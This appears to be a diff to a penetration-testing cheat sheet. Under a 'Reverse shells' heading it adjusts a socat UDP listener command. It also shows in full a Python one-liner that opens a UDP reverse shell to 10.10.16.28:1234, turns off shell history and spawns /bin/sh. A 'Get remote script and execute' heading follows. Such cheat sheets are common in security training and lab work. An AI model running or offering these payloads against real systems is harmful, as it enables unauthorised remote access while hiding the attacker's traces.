@@ -12,7 +12,7 @@
 
 ## Reverse shells
 
-* `socat file:’tty’,echo=0,raw udp-listen:4444`
+* socat file:\`tty\`,echo=0,raw udp-listen:4444
 * `import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.16.28\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])`
 
 ## Get remote script and execute
